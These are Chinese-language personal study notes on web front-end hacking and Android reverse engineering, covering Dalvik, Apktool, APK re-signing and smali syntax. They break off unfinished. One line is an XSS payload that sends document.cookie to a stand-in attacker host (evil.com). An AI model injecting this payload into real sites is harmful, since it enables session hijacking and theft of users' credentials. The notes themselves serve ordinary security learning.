#  学习笔记
## Web前端黑客技术揭秘
### POC理解&学习
1. XSS获取敏感信息：eval(‘new Image().src=“http://www.evil.com/steal.php?c=“+escape(document.cookie)')

## Android逆向学习
### 基础知识
1. Davlik Android OS的虚拟机，Dalvik基于寄存器，Java VM基于栈，二者明显区别。Davlik专属文件执行格式dex，比Java JVM运行快，内存占用少。
2. 反编译 Apktool、dex2jar+jd-gui，最终修改APK需要操作.smali文件，然后再使用Apktool将修改的文件打包成APK，再使用 jarsigner进行APK签名：jarsigner -keystore name.keystore Folder keystorealias -keypass passwd
3. Davlik中寄存器32位，64位类型（Long/Double）用2个寄存器表示，字节码2中类型：原始类型、引用类型（包括对象和数组）
	- B- - -byte
	- C- - -char
	- D- - -double
	- F- - -float
	- I- - -int
	- J- - -long
	- S- - -short
	- V- - -void
	- Z- - -boolean
	- [XXX- - -array
	- Lxxx/yyy- - -object : LpackageName/objectName$subObjectName;
4. smali函数
	1.  hello()V —\> void hello()
	2. hello(III)Z —\> boolean hello(int,int,int)
	3. hello(Z[I[ILjava/lang/String;J)Ljava/lang/String; —\> String hello(boolean,int[],int[],String,long)
5. Smali基本语法
	1. .field private isFlag:z   定义变量  
		.field button_login:Landroid/widget/Button;
	2. 
		6. 